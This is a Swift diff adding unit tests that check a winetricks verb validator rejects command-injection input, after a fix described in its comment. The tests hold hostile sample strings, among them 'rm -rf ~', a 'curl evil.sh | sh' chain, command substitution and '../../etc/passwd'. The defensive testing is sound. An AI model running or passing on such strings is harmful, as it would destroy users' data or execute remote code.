@@ -46,3 +46,33 @@ func runReaperTests(_ t: Harness) {
     t.expect(!found.contains { $0.pid == me }, "the scan never targets itself")
     t.expect(found.allSatisfy { $0.pid > 0 }, "every stray has a usable pid")
 }
+
+/// Recipe verbs were interpolated into a `sh -c` string, so anything after a
+/// semicolon ran as a command. They now go through an argv array, and the verb
+/// is validated as well — defence in depth, since the CLI takes arbitrary verbs
+/// and winetricks itself would choke on the rest anyway.
+func runRecipeVerbTests(_ t: Harness) {
+    t.suite("winetricks verb validation")
+    let ok = RecipeRunner.isValidVerb
+
+    t.expect(ok("vcrun2019"), "an ordinary verb is allowed")
+    t.expect(ok("lavfilters702"), "digits are allowed")
+    t.expect(ok("d3dcompiler_47"), "underscores are allowed")
+    t.expect(ok("dotnet48"), "a real preset verb is allowed")
+
+    t.expect(!ok("vcrun; rm -rf ~"), "a shell separator is refused")
+    t.expect(!ok("vcrun && curl evil.sh | sh"), "a command chain is refused")
+    t.expect(!ok("$(whoami)"), "command substitution is refused")
+    t.expect(!ok("`id`"), "backtick substitution is refused")
+    t.expect(!ok("vcrun 2019"), "a space is refused")
+    t.expect(!ok("../../etc/passwd"), "a path is refused")
+    t.expect(!ok(""), "an empty verb is refused")
+    t.expect(!ok(String(repeating: "a", count: 65)), "an absurdly long verb is refused")
+
+    // Every shipped preset must survive its own validation.
+    for (name, preset) in RecipeRunner.presets {
+        for v in preset.verbs {
+            t.expect(ok(v), "preset \(name) verb \(v) passes validation")
+        }
+    }
+}
